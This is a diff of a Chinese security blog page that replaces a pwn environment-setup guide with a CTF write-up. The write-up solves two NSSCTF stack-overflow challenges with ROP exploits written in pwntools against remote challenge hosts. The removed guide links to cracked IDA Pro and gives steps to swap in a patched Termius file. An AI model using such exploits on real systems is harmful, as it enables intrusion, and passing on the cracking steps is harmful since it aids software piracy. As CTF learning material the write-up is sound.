@@ -19,24 +19,22 @@
   <meta name="author" content="Gh0stF0xy">
   <meta name="keywords" content="">
   
-    <meta name="description" content="基础工具介绍 IDA Pro 9.0: 宇宙第一好用的反汇编和反编译工具，能通过二进制文件反汇编出相应的汇编代码，进而反编译出易懂的C语言代码，便于了解ELF文件是如何工作的。  vim: 简单但是强大的文件编辑器，可用于写攻击脚本exp  pwntools: Python中写针对CTF的pwn环境的攻击脚本提供的一个强大的库，具体用法在后面会有简单介绍  ROPgadget: 命令行工具，能轻松">
+    <meta name="description" content="[GFCTF 2021]where_is_shellchecksec一下 123456Arch:       amd64-64-little  RELRO:      Partial RELRO  Stack:      No canary found  NX:         NX enabled  PIE:        No PIE (0x400000)  Stripped:   No  6">
 <meta property="og:type" content="article">
-<meta property="og:title" content="如何优雅地配置pwn环境(Win|Mac)">
-<meta property="og:url" content="https://www.ghostfoxy.cn/2025/11/08/FTN001/index.html">
+<meta property="og:title" content="NSSCTF中的SWPU刷题记录">
+<meta property="og:url" content="https://www.ghostfoxy.cn/2025/11/16/SWPU/index.html">
 <meta property="og:site_name" content="GhostFoxy&#39;s 网安世界">
-<meta property="og:description" content="基础工具介绍 IDA Pro 9.0: 宇宙第一好用的反汇编和反编译工具，能通过二进制文件反汇编出相应的汇编代码，进而反编译出易懂的C语言代码，便于了解ELF文件是如何工作的。  vim: 简单但是强大的文件编辑器，可用于写攻击脚本exp  pwntools: Python中写针对CTF的pwn环境的攻击脚本提供的一个强大的库，具体用法在后面会有简单介绍  ROPgadget: 命令行工具，能轻松">
+<meta property="og:description" content="[GFCTF 2021]where_is_shellchecksec一下 123456Arch:       amd64-64-little  RELRO:      Partial RELRO  Stack:      No canary found  NX:         NX enabled  PIE:        No PIE (0x400000)  Stripped:   No  6">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-11-08T05:04:37.000Z">
-<meta property="article:modified_time" content="2025-11-13T11:55:59.829Z">
+<meta property="article:published_time" content="2025-11-16T12:58:03.000Z">
+<meta property="article:modified_time" content="2025-11-16T15:52:53.650Z">
 <meta property="article:author" content="Gh0stF0xy">
-<meta property="article:tag" content="pwn">
-<meta property="article:tag" content="新手入门">
-<meta property="article:tag" content="环境配置">
+<meta property="article:tag" content="pwn,题解,write-up">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>如何优雅地配置pwn环境(Win|Mac) - GhostFoxy&#39;s 网安世界</title>
+  <title>NSSCTF中的SWPU刷题记录 - GhostFoxy&#39;s 网安世界</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -207,7 +205,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="如何优雅地配置pwn环境(Win|Mac)"></span>
+            <span id="subtitle" data-typed-text="NSSCTF中的SWPU刷题记录"></span>
           
         </div>
 
@@ -218,8 +216,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-11-08 13:04" pubdate>
-          2025年11月8日 下午
+        <time datetime="2025-11-16 20:58" pubdate>
+          2025年11月16日 晚上
         </time>
       </span>
     
@@ -230,7 +228,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          917 字
+          506 字
         
       </span>
     
@@ -241,7 +239,7 @@
         
         
         
-          8 分钟
+          5 分钟
         
       </span>
     
@@ -287,12 +285,12 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">如何优雅地配置pwn环境(Win|Mac)</h1>
+            <h1 id="seo-header">NSSCTF中的SWPU刷题记录</h1>
             
               <p id="updated-time" class="note note-info" style="display: none">
                 
                   
-                    本文最后更新于 2025-11-13T19:55:59+08:00
+                    本文最后更新于 2025-11-16T23:52:53+08:00
                   
                   
 
@@ -302,84 +300,64 @@
             
               <div class="markdown-body">
                 
-                <h3 id="基础工具介绍"><a href="#基础工具介绍" class="headerlink" title="基础工具介绍"></a>基础工具介绍</h3><ul>
-<li><p><strong>IDA Pro 9.0</strong>: 宇宙第一好用的反汇编和反编译工具，能通过二进制文件反汇编出相应的汇编代码，进而反编译出易懂的C语言代码，便于了解ELF文件是如何工作的。</p>
-</li>
-<li><p><strong>vim</strong>: 简单但是强大的文件编辑器，可用于写攻击脚本exp</p>
-</li>
-<li><p><strong>pwntools</strong>: Python中写针对CTF的pwn环境的攻击脚本提供的一个强大的库，具体用法在后面会有简单介绍</p>
-</li>
-<li><p><strong>ROPgadget</strong>: 命令行工具，能轻松从ELF文件中提取代码片段，对构造ROP链形成攻击脚本给予了极大方便。</p>
-</li>
-<li><p><strong>onegadget</strong>: 一种能够<strong>大幅简化漏洞利用过程</strong>的强大技术</p>
-</li>
-<li><p><strong>gdb</strong>：代码调试工具，有各种强大的功能，如查看栈和寄存器的情况，查找函数地址，程序调试等。</p>
-</li>
-<li><p><strong>pwndbg</strong>: gdb的强大插件之一，是gdb的赛博朋克增强版，极大简化了调试流程。</p>
-</li>
-<li><p><strong>Termius</strong>: 强大的SSH工具，功能类似于XShell，支持SFTP文件传输协议</p>
-</li>
-<li><p><strong>UTM</strong>：稍逊色于vmware和Parallels Desktop的另一虚拟机软件，它具有模拟架构功能，是MacBook等ARM架构的设备调试x86架构的ELF文件的必需软件。</p>
-</li>
-</ul>
-<h3 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h3><p><strong>IDA Pro 9.0</strong>:</p>
-<p>使用Windows的师傅直接点击<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1eCmxbP6nNHm5qz41rFbetg?pwd=5hdq" title="这里">这里</a>下载</p>
-<p>使用Mac的师傅点击<a target="_blank" rel="noopener" href="https://macked.app/ida-professional-9-2-250908-for-mac-crack.html" title="这里">这里</a>后登录账号下载，没有就注册一个</p>
-<p><strong>UTM</strong>：</p>
-<p>Win的师傅可跳过这一步，Mac的师傅点击<a target="_blank" rel="noopener" href="https://mac.getutm.app/">这里</a>下载</p>
-<p><strong>Termius</strong>：</p>
-<p>如果你喜欢用图形化界面的虚拟机也可以下载，用作后面AWD连接靶机的工具</p>
-<p>配置文件&#x2F;安装包：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1H1UbuxVodjao-5ABrFy2Cg?pwd=cauc">点我选择性下载</a></p>
-<p>配置文件：app.asar</p>
-<p>Win安装包：Termius.zip</p>
-<p>随后在C:&#x2F;&#x2F;Users&#x2F;你的用户名&#x2F;AppData&#x2F;Local&#x2F;Programs&#x2F;Termius&#x2F;resources目录下，把原来的同名配置文件替换为上面刚下载的配置文件</p>
-<p>Mac安装包：Termius.dmg</p>
-<p>随后在&#x2F;Applications&#x2F;Termius.app&#x2F;Contents&#x2F;resources目录下将同名文件替换</p>
-<p>在虚拟机中输入：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ifconfig <span class="hljs-comment">#可看到自己虚拟机的IP地址</span><br><span class="hljs-built_in">sudo</span> service ssh restart <span class="hljs-comment">#重启ssh服务</span><br></code></pre></td></tr></table></figure>
+                <h3 id="GFCTF-2021-where-is-shell"><a href="#GFCTF-2021-where-is-shell" class="headerlink" title="[GFCTF 2021]where_is_shell"></a>[GFCTF 2021]where_is_shell</h3><p>checksec一下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">Arch:       amd64-64-little<br>  RELRO:      Partial RELRO<br>  Stack:      No canary found<br>  NX:         NX enabled<br>  PIE:        No PIE (0x400000)<br>  Stripped:   No<br></code></pre></td></tr></table></figure>
 
-<p>随后打开Termius新建主机，输入ip地址，虚拟机的用户名和密码，点击链接即可在Termius界面使用虚拟机了</p>
-<h3 id="虚拟机环境配置"><a href="#虚拟机环境配置" class="headerlink" title="虚拟机环境配置"></a>虚拟机环境配置</h3><p>检查虚拟机版本是否为Ubuntu 22.04，若不是请重新下载，否则安装过程会出问题</p>
-<p>打开虚拟机，打开终端，输入以下命令换源：</p>
-<ol>
-<li><p><strong>备份原始源列表</strong>：为防止出错时能够恢复，请务必先备份 。</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak<br></code></pre></td></tr></table></figure>
-</li>
-<li><p><strong>编辑源列表文件</strong>：使用vim打开源列表文件 。</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim /etc/apt/sources.list<br></code></pre></td></tr></table></figure>
-</li>
-<li><p><strong>替换为清华源配置</strong>：将文件里的原有内容全部删除或注释掉，然后粘贴以下配置内容。这里的 <code>jammy</code>是 Ubuntu 22.04 的版本代号，请确保使用它 。</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">清华大学镜像源配置</span><br>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy main restricted universe multiverse<br><span class="hljs-meta prompt_"># </span><span class="language-bash">deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy main restricted universe multiverse</span><br>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse<br><span class="hljs-meta prompt_"># </span><span class="language-bash">deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse</span><br>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse<br><span class="hljs-meta prompt_"># </span><span class="language-bash">deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse</span><br>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-security main restricted universe multiverse<br><span class="hljs-meta prompt_"># </span><span class="language-bash">deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-security main restricted universe multiverse</span><br></code></pre></td></tr></table></figure>
+<p>64位程序，有NX保护，栈不可执行，无法使用shellcode</p>
+<p>查看源代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  _BYTE buf[<span class="hljs-number">16</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br><br>  system(<span class="hljs-string">&quot;echo &#x27;zltt lost his shell, can you find it?&#x27;&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x38u</span>LL);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
 
-<p>完成后，保存并退出编辑器（:wq!）。</p>
-</li>
-</ol>
-<p>更新虚拟机：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Bash"><span class="hljs-built_in">sudo</span> apt update<br><span class="hljs-built_in">sudo</span> apt upgrade -y<br></code></pre></td></tr></table></figure>
+<p>明显的栈溢出。</p>
+<p>看到有system函数，可以想到调用system(“&#x2F;bin&#x2F;sh”)</p>
+<p>尝试寻找”&#x2F;bin&#x2F;sh”串：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ROPgadget --binary shell --string &quot;/bin/sh&quot;<br></code></pre></td></tr></table></figure>
 
-<p>等待进程结束。</p>
-<h3 id="vim下载"><a href="#vim下载" class="headerlink" title="vim下载"></a>vim下载</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install vim<br></code></pre></td></tr></table></figure>
+<p>没有找到，那怎么办？</p>
+<p>这里就需要一个<strong>新的知识点</strong>：<em>调用system(0)也可以达到拿到shell的效果</em>。</p>
+<p>因为栈不可执行，所以我们不能写入0，只能找现有的。</p>
+<p>查看函数tips()：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C">__int64 <span class="hljs-title function_">tips</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-keyword">return</span> MEMORY[<span class="hljs-number">0x403569</span>]();<br>&#125;<br></code></pre></td></tr></table></figure>
 
-<h3 id="Pwntools下载"><a href="#Pwntools下载" class="headerlink" title="Pwntools下载"></a>Pwntools下载</h3><p>两种方法</p>
-<p>1.pip安装</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-get install python3-pip<br><span class="hljs-built_in">sudo</span> apt install git -y<br>pip3 install pwntools<br></code></pre></td></tr></table></figure>
+<p>查看汇编，发现这里有一段机器码为：24 30 这个机器码对应着$0</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:0000000000400540 E8 24 30 00 00                 call    near ptr 403569h<br></code></pre></td></tr></table></figure>
 
-<p>2.源码安装</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/Gallopsled/pwntools<br><span class="hljs-built_in">cd</span> pwntools<br>pip install -e .<br></code></pre></td></tr></table></figure>
+<p>所以可以调用地址：0x400541来当作$0</p>
+<p>偏移量：0x10 + 0x8</p>
+<p>寻找system(),pop_rdi和ret的地址：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">(gdb)p &amp;system<br><span class="hljs-meta prompt_">$</span><span class="language-bash">1 = (&lt;text variable, no debug info&gt; *) 0x400430 &lt;system@plt&gt;</span><br></code></pre></td></tr></table></figure>
 
-<h3 id="ROPgadget下载"><a href="#ROPgadget下载" class="headerlink" title="ROPgadget下载"></a>ROPgadget下载</h3><p>1.pip安装</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip3 install ROPgadget<br></code></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">ROPgadget --binary shell --only &quot;pop|ret&quot; | grep rdi<br>0x00000000004005e3 : pop rdi ; ret<br></code></pre></td></tr></table></figure>
 
-<p>2.源码安装</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/JonathanSalwan/ROPgadget.git<br><span class="hljs-built_in">cd</span> ROPgadget<br>python3 setup.py<br></code></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">ROPgadget --binary shell --only &quot;ret&quot;<br>Gadgets information<br>============================================================<br>0x0000000000400416 : ret<br><br>Unique gadgets found: 1<br></code></pre></td></tr></table></figure>
 
-<h3 id="Onegadget下载"><a href="#Onegadget下载" class="headerlink" title="Onegadget下载"></a>Onegadget下载</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install ruby<br><span class="hljs-built_in">sudo</span> gem install one_gadget<br></code></pre></td></tr></table></figure>
+<p>可知system函数,pop_rdi和ret的地址分别是0x400430,0x4005e3,0x400416</p>
+<p>构造exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = remote(<span class="hljs-string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="hljs-number">28234</span>)<br>offset = <span class="hljs-number">0x10</span> + <span class="hljs-number">0x8</span><br>system_addr = <span class="hljs-number">0x400430</span><br>ret_addr = <span class="hljs-number">0x400416</span><br>sh_addr = <span class="hljs-number">0x400541</span><br>pop_rdi = <span class="hljs-number">0x4005e3</span><br>payload = offset * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(pop_rdi) + p64(sh_addr) + p64(ret_addr) + p64(system_addr)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
 
-<h3 id="gdb下载"><a href="#gdb下载" class="headerlink" title="gdb下载"></a>gdb下载</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install gdb<br></code></pre></td></tr></table></figure>
+<p>执行代码，拿到shell</p>
+<h3 id="NSSCTF-2022-Spring-Recruit-R3m4ke"><a href="#NSSCTF-2022-Spring-Recruit-R3m4ke" class="headerlink" title="[NSSCTF 2022 Spring Recruit]R3m4ke?"></a>[NSSCTF 2022 Spring Recruit]R3m4ke?</h3><p>checksec一下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">Arch:       amd64-64-little<br>  RELRO:      Partial RELRO<br>  Stack:      No canary found<br>  NX:         NX enabled<br>  PIE:        No PIE (0x400000)<br>  Stripped:   No<br></code></pre></td></tr></table></figure>
 
-<h3 id="pwndbg下载"><a href="#pwndbg下载" class="headerlink" title="pwndbg下载"></a>pwndbg下载</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/pwndbg/pwndbg<br><span class="hljs-built_in">cd</span> pwndbg<br>./setup.sh<br></code></pre></td></tr></table></figure>
+<p>64位程序，NX开启，栈不可执行。</p>
+<p>IDA查看源码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  _BYTE v4[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-20h] BYREF</span><br><br>  init(argc, argv, envp);<br>  NSS();<br>  <span class="hljs-keyword">return</span> gets(v4);<br>&#125;<br></code></pre></td></tr></table></figure>
 
-<p>至此一个相对完整的Pwn虚拟机环境已经配置完毕。</p>
+<p>明显栈溢出。</p>
+<p>NSS函数就是显示一些无用信息，查看函数列表发现有个后门函数LookAtMe：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">LookAtMe</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>直接给了shell，那就很好办了</p>
+<p>偏移量：0x20 + 0x8</p>
+<p>查找LookAtMe和ret的地址</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">(gdb)p &amp;LookAtMe<br><span class="hljs-meta prompt_">$</span><span class="language-bash">1 = (&lt;text variable, no debug info&gt; *) 0x40072c &lt;LookAtMe&gt;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">ROPgadget --binary r3m4ke1t --only &quot;ret&quot;<br>Gadgets information<br>============================================================<br>0x000000000040057e : ret<br><br>Unique gadgets found: 1<br></code></pre></td></tr></table></figure>
+
+<p>地址分别是：0x40072c,0x40057e</p>
+<p>构造exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = remote(<span class="hljs-string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="hljs-number">28397</span>)<br>offset = <span class="hljs-number">0x20</span> + <span class="hljs-number">0x8</span><br>sh_addr = <span class="hljs-number">0x40072c</span><br>ret_addr = <span class="hljs-number">0x40057e</span><br>payload = offset * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(ret_addr) + p64(sh_addr)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>执行程序拿到shell。</p>
 
                 
               </div>
@@ -398,13 +376,20 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E6%96%B0%E6%89%8B%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/" class="category-chain-item">新手入门教程</a>
+  <a href="/categories/%E5%88%B7%E9%A2%98%E9%A2%98%E8%A7%A3/" class="category-chain-item">刷题题解</a>
   
   
     <span>></span>
     
-  <a href="/categories/%E6%96%B0%E6%89%8B%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" class="category-chain-item">环境配置</a>
+  <a href="/categories/%E5%88%B7%E9%A2%98%E9%A2%98%E8%A7%A3/NSSCTF/" class="category-chain-item">NSSCTF</a>
   
+  
+    <span>></span>
+    
+  <a href="/categories/%E5%88%B7%E9%A2%98%E9%A2%98%E8%A7%A3/NSSCTF/SWPU/" class="category-chain-item">SWPU</a>
+  
+  
+
   
 
   
@@ -420,11 +405,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/pwn/" class="print-no-link">#pwn</a>
-      
-        <a href="/tags/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" class="print-no-link">#环境配置</a>
-      
-        <a href="/tags/%E6%96%B0%E6%89%8B%E5%85%A5%E9%97%A8/" class="print-no-link">#新手入门</a>
+        <a href="/tags/pwn-%E9%A2%98%E8%A7%A3-write-up/" class="print-no-link">#pwn,题解,write-up</a>
       
     </div>
   
@@ -436,8 +417,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>如何优雅地配置pwn环境(Win|Mac)</div>
-      <div>https://www.ghostfoxy.cn/2025/11/08/FTN001/</div>
+      <div>NSSCTF中的SWPU刷题记录</div>
+      <div>https://www.ghostfoxy.cn/2025/11/16/SWPU/</div>
     </div>
     <div class="license-meta">
       
@@ -449,13 +430,13 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年11月8日</div>
+          <div>2025年11月16日</div>
         </div>
       
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2025年11月13日</div>
+          <div>2025年11月16日</div>
         </div>
       
       
@@ -486,15 +467,15 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/11/14/buuwp1/" title="BUUCTF题解">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">BUUCTF题解</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
+                    
+                      <a href="/2025/11/14/buuwp1/" title="BUUCTF题解">
+                        <span class="hidden-mobile">BUUCTF题解</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
                     
                   </article>
                 </div>
